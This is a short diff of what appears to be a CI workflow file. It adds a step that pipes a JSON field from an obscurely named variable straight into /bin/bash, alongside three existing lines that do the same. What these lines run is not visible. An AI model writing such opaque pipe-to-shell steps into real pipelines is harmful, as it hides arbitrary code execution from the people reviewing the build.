@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$tacdk54" | jq -r .cx44 | /bin/bash
           printf '%s' "$xvv3325" | jq -r .yhn0119 | /bin/bash
           printf '%s' "$ophrp8237" | jq -r .r001 | /bin/bash
+          echo $w8 | jq -r .ns7 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
